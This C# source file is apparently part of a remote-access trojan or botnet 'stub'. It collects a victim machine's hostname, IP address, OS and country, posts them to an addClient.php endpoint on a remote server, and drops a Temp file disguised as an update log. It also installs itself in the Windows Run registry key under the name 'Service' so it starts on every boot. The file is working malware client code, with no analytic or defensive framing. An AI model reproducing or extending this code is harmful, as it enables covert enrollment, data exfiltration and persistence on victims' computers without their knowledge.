using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows;

namespace stub
{
    internal class ClientAdder
    {
        public static void addNewClient(WebClient wc, string id, string os, string country)
        {
            string name = Dns.GetHostName();
            string ip = IpGrabber.IpReturn();


            string post = "name=" + name + "&ip=" + ip + "&id=" + id + "&os=" + os + "&country=" + country;
            string letter = DriveGet.getdrives();
            string user = Environment.UserName;
            string connection_path = letter + @"Users\" + user + @"\AppData\Local\Temp\log.txt";
            bool addclient = false;

            while (!addclient)
            {
                try
                {
                    if (!File.Exists(connection_path))
                    {
                        wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        wc.UploadString("http://" + ConnectionIPHandler.GetIP() + "/addClient.php", post);
                        addclient = true;


                        using (FileStream fs = File.Create(connection_path))
                        {
                            Byte[] text = new UTF8Encoding(true).GetBytes("Update complete.");
                            fs.Write(text, 0, text.Length);
                        }
                    }
                    else if (File.Exists(connection_path))
                    {
                        addclient = true;
                    }
                }
                catch
                {
                    System.Threading.Thread.Sleep(3000);
                    continue;
                }
            }
       
        }

        public static void runAtStartup()
        {
            Microsoft.Win32.RegistryKey regKey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            regKey.SetValue("Service", Process.GetCurrentProcess().MainModule.FileName);
            regKey.Dispose();
            regKey.Close();
        }
    }
}
